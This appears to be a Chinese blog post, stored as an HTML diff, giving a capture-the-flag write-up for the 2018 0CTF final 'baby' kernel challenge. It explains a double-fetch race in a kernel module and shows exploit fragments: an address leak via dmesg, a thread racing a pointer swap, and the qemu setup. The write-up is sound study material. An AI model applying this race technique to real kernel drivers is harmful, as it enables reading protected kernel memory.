@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux kernel pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="第三道Linux kernel pwn的题目，这道题做完WIKI关于内核的就学习完了。 调试题目只给了baby.ko和加载的文件系统core.cpio，没有bzImage，为了调试，我们需要得到其原始内核,在IDA中可以看到其内核版本为4.15.0-22-generic SMP mod_unload。在这里下载对应内核的deb包linux-image-4.15.0-22-generic_4.15.">
+<meta name="keywords" content="Linux kernel pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 0ctf final baby">
+<meta property="og:url" content="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="第三道Linux kernel pwn的题目，这道题做完WIKI关于内核的就学习完了。 调试题目只给了baby.ko和加载的文件系统core.cpio，没有bzImage，为了调试，我们需要得到其原始内核,在IDA中可以看到其内核版本为4.15.0-22-generic SMP mod_unload。在这里下载对应内核的deb包linux-image-4.15.0-22-generic_4.15.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/2.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/3.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/4.png">
+<meta property="og:updated_time" content="2019-08-27T13:34:22.595Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018 0ctf final baby">
+<meta name="twitter:description" content="第三道Linux kernel pwn的题目，这道题做完WIKI关于内核的就学习完了。 调试题目只给了baby.ko和加载的文件系统core.cpio，没有bzImage，为了调试，我们需要得到其原始内核,在IDA中可以看到其内核版本为4.15.0-22-generic SMP mod_unload。在这里下载对应内核的deb包linux-image-4.15.0-22-generic_4.15.">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/"/>
+
+
+
+
+
+  <title>2018 0ctf final baby | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/08/27/20180ctf-final-baby/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018 0ctf final baby</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T14:59:50+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第三道Linux kernel pwn的题目，这道题做完WIKI关于内核的就学习完了。</p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>题目只给了baby.ko和加载的文件系统core.cpio，没有bzImage，为了调试，我们需要得到其原始内核,在IDA中可以看到其内核版本为4.15.0-22-generic SMP mod_unload。<br><img src="/2019/08/27/20180ctf-final-baby/2.png" alt="1"><br>在<a href="https://ubuntu.pkgs.org/18.04/ubuntu-updates-main-amd64/linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb.html" target="_blank" rel="noopener">这里</a>下载对应内核的deb包linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb，解压，在./data/boot中得到vmlinuz-4.15.0-22-generic。</p>
+<p>查看模块加载的基址，在init启动文件中加入以下命令，使得内核启动时便是root权限，这样可以查看baby.ko加载的基址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure></p>
+<p>通过lsmod命令查看加载的模块及基址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # lsmod</span><br><span class="line">baby 16384 0 - Live 0xffffffffc030a000 (OE)</span><br></pre></td></tr></table></figure></p>
+<p>gdb启动vmlinuz-4.15.0-22-generic，连接调试，并添加符号表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinuz-4.15.0-22-generic</span><br><span class="line">target remote localhost:1234</span><br><span class="line">add-symbol-file baby.ko 0xffffffffc030a000</span><br></pre></td></tr></table></figure></p>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>主要关注baby_ioctl这个函数。当ioctl命令为0x6666时，输出flag的地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">&#123;</span><br><span class="line">  printk(<span class="string">"Your flag is at %px! But I don't think you know it's content\n"</span>, flag);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="题目的三个check"><a href="#题目的三个check" class="headerlink" title="题目的三个check"></a>题目的三个check</h2><p>当命令为0x1337时，程序首先进行了三个check，然后再将用户输入的内容与flag进行逐字节比较，若通过校验，则将硬编码的flag输出。<br>主要看一下这里的三个check。首先，通过对函数的分析，可以得到存储用户输入数据的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> attr            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> flag_str        dq ?</span><br><span class="line"><span class="number">00000008</span> flag_len        dq ?</span><br><span class="line"><span class="number">00000010</span> attr            ends</span><br></pre></td></tr></table></figure></p>
+<p>第一个和第二个check都调用了_chk_range_not_ok这个函数。IDA里F5大致可以看到它的功能，函数有三个参数，第一个参数是一个指针，第二个参数是长度，函数将第一个参数与第二个参数相加，再与第三个参数比较，若第三个参数比较大，则返回False，否则返回True。题目里若想通过第一个和二个check的检查，则需要返回False，也就是第一个和第二个参数之和小于第三个参数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __fastcall _chk_range_not_ok(__int64 ptr, __int64 len, <span class="keyword">unsigned</span> __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(len, ptr);</span><br><span class="line">  v4 = len + ptr;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = a3 &lt; v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>动态调试可以看到在第一个和第二个check中第三个参数的地址：<br><img src="/2019/08/27/20180ctf-final-baby/1.png" alt="2"><br>这里涉及到64位进程的内存布局，在64位系统中，没有完全用到64位长的地址空间，只有低48位用来寻址，虚拟内存空间为256TB(2^48)，同样采用经典内存布局，如下图所示。<br><img src="/2019/08/27/20180ctf-final-baby/3.png" alt="3"><br>(图来源于《glibc内存管理ptmalloc源代码分析@华庭》)</p>
+<p>寄存器RDX的地址恰好是用户空间的边界，那我们就知道这两个check的作用，第一个check检查存储用户输入的结构体数据地址是否在用户空间，因为结构体有2个成员，大小为0x10。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_chk_range_not_ok((__int64)v2, <span class="number">16L</span>L, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br></pre></td></tr></table></figure></p>
+<p>第二个check是用户输入的flag数据是否在用户空间：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!_chk_range_not_ok(</span><br><span class="line">               v5-&gt;flag_str,</span><br><span class="line">               SLODWORD(v5-&gt;flag_len),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x1358</span>))</span><br></pre></td></tr></table></figure></p>
+<p>第三个check是检查用户输入的数据长度与flag长度是否相等。</p>
+<h2 id="Double-fetch"><a href="#Double-fetch" class="headerlink" title="Double fetch"></a>Double fetch</h2><p>这里涉及到一个叫做Double fetch的漏洞，可以看<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/" target="_blank" rel="noopener">CTF-WIKI</a>上的讲解，已经写的很详细了，简单来说，这种漏洞属于内核和用户的一种数据访问竞争漏洞，当用户空间向内核传递数据时，除了使用copy_from_user等函数直接将用户数据拷贝至内核外，还有另外一种情况就是向内核传递的只是数据指针，数据仍然存储在用户空间，那存储于用户空间的数据就可能被篡改。<br>应用到这道题目就是用户输入的数据存储在用户空间，当ioctl的命令为0x1337时，用户输入一个字符串，能够通过三个check的检查，但是不能通过下一步逐字节比对的检查，也就不能最后输出flag，再通过三个check的检查后，设置一个线程不断地将存储用户输入数据的结构体成员flag_str所指向的地址修改为真正存储于内核空间的flag的地址，在命令为0x6666时可以得到这个地址，这样就能通过最后字节比对的检查，从而输出flag。</p>
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>首先ioctl的命令为0x6666，来获取flag的地址：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ioctl 0x6666</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/baby"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> ret = ioctl(fd,<span class="number">0x6666</span>);</span><br></pre></td></tr></table></figure></p>
+<p>可以通过dmesg来读取输出的内容，重定向到/tmp/record.txt，然后读该文件，主要说一下为什么要调用lseek函数重定位文件指针的位置，可以打开record.txt看一下这个文件，其中flag的地址靠近文件末尾，因此以SEKK_END文件末尾为基准，左移若干偏移来读取文件，确保一定能读取到flag的地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//read flag addr</span></span><br><span class="line">system(<span class="string">"dmesg &gt; /tmp/record.txt"</span>);</span><br><span class="line"><span class="keyword">int</span> addr_fd = open(<span class="string">"/tmp/record.txt"</span>,O_RDONLY);</span><br><span class="line">lseek(addr_fd,-LEN,SEEK_END);</span><br><span class="line">read(addr_fd,buf,LEN);</span><br><span class="line">close(addr_fd);</span><br></pre></td></tr></table></figure></p>
+<p>然后通过定位”Your flag is at “字符串来找到flag地址所在位置，然后读取，并将字符串转化为十六进制的数字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//get flag addr</span><br><span class="line">   idx = strstr(buf,&quot;Your flag is at &quot;);</span><br><span class="line">   printf(&quot;idx: %d\n&quot;,idx);</span><br><span class="line">   if(idx == 0)&#123;</span><br><span class="line">      printf(&quot;[-]Not found addr\n&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">      idx += 16;</span><br><span class="line">      addr = strtoull(idx,idx+16,16); //string to int</span><br><span class="line">      printf(&quot;[+]flag addr: %p\n&quot;,addr);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>构造一个结构体，它的长度与flag的长度相同，可以在IDA里看到flag的长度为33。创建一个恶意线程，不断的去改变结构体中flag的地址指向上面获取到的flag的地址，同时主线程发送0x1337的命令进行flag的check，并将flag指向一个用户空间地址，exp里用了之前读文件的buf，从而通过程序中的三个check检查，恶意线程与主线程进行条件竞争，当主线程中三次check通过，恶意线程恰好将flag指向的地址修改为真正flag的地址时，正好能通过程序逐字节比对的检查，从而输出flag。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t.len = <span class="number">33</span>;</span><br><span class="line">t.flag = buf;</span><br><span class="line">pthread_create(&amp;t1,<span class="literal">NULL</span>,change_attr_value,&amp;t);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TRYTIME;i++)&#123;</span><br><span class="line">    ret = ioctl(fd,<span class="number">0x1337</span>,&amp;t);</span><br><span class="line">    t.flag = buf;</span><br><span class="line">&#125;</span><br><span class="line">~</span><br></pre></td></tr></table></figure></p>
+<p>最后同样适用dmesg命令读取输出的flag，要多试几次，最后得到flag：<br><img src="/2019/08/27/20180ctf-final-baby/4.png" alt="4"><br>大佬们的博客里都说要设置好core和thread的数目，因为qemu默认启动core=1，thread=1，不易造成条件竞争。这里start.sh的内容是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-22-generic \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokalsr&quot; \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  -enable-kvm  \</span><br><span class="line">-gdb tcp::1234 \</span><br><span class="line"># -S</span><br></pre></td></tr></table></figure></p>
+<p>完整的exp在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/" target="_blank" rel="noopener">这里</a>，我就不写了，写这篇博客主要是记录自己学习的过程，静态编译exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static exp.c -lpthread -o exp</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/</a><br><a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/</a><br><a href="http://p4nda.top/2018/07/20/0ctf-baby/" target="_blank" rel="noopener">http://p4nda.top/2018/07/20/0ctf-baby/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux-kernel-pwn/" rel="tag"># Linux kernel pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/25/pwnable-kr-random/" rel="next" title="pwnable.kr random">
+                <i class="fa fa-chevron-left"></i> pwnable.kr random
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#调试"><span class="nav-number">1.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目描述"><span class="nav-number">2.</span> <span class="nav-text">题目描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目的三个check"><span class="nav-number">2.1.</span> <span class="nav-text">题目的三个check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-fetch"><span class="nav-number">2.2.</span> <span class="nav-text">Double fetch</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用过程"><span class="nav-number">3.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
